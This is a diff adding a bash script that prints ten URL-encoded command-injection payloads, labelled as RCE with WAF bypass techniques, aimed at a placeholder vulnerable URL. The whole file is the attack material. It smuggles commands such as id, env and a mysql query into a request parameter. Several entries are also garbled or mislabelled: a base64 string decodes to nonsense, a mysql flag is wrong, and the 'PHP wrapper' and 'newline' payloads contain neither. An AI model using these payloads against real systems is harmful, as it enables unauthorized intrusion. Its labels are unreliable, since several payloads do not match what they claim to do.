@@ -1,0 +1,46 @@
+#!/bin/bash
+
+# Example payloads for RCE with WAF bypass techniques
+
+# 1. Basic Command Injection with URL Encoding
+payload1="http://example.com/vulnerable?param=cmd%3D%28%27id%27%29"
+echo "Payload 1: $payload1"
+
+# 2. Double URL Encoding
+payload2="http://example.com/vulnerable?param=cmd%253D%2528%2527id%2527%2529"
+echo "Payload 2: $payload2"
+
+# 3. Base64 Encoding
+payload3="http://example.com/vulnerable?param=cmd%3D%28%27echo%20%24%28echo%20c3NoIGNoYW5nZQ%29%27%29"
+echo "Payload 3: $payload3"
+
+# 4. Unix Time-Based Payload
+payload4="http://example.com/vulnerable?param=cmd%3D%28%27date%20%26%26%20id%27%29"
+echo "Payload 4: $payload4"
+
+# 5. Nested Encodings
+payload5="http://example.com/vulnerable?param=cmd%253D%2528%2527echo%2520%2524%2528echo%2520c3NoIGNoYW5nZQ%2529%2527%2529"
+echo "Payload 5: $payload5"
+
+# 6. Using Environment Variables
+payload6="http://example.com/vulnerable?param=cmd%3D%28%27%24%28env%29%27%29"
+echo "Payload 6: $payload6"
+
+# 7. Bypassing WAF with Delimiters
+payload7="http://example.com/vulnerable?param=cmd%3D%28%27%24%28command%20%24%28echo%20%24%28echo%20id%29%29%29%27%29"
+echo "Payload 7: $payload7"
+
+# 8. Payload with SQL Injection
+payload8="http://example.com/vulnerable?param=cmd%3D%28%27%24%28mysql%20-U%20root%20-e%20%27SELECT%20user()%27%29%27%29"
+echo "Payload 8: $payload8"
+
+# 9. Using PHP Wrappers
+payload9="http://example.com/vulnerable?param=cmd%3D%28%27php%20%27%29%27"
+echo "Payload 9: $payload9"
+
+# 10. Bypassing WAF with Newline Characters
+payload10="http://example.com/vulnerable?param=cmd%3D%28%27%24%28echo%20%22id%22%29%27%29"
+echo "Payload 10: $payload10"
+
+# End of Payloads
+echo "Payloads listed above can be used for testing purposes. Ensure proper authorization before testing."
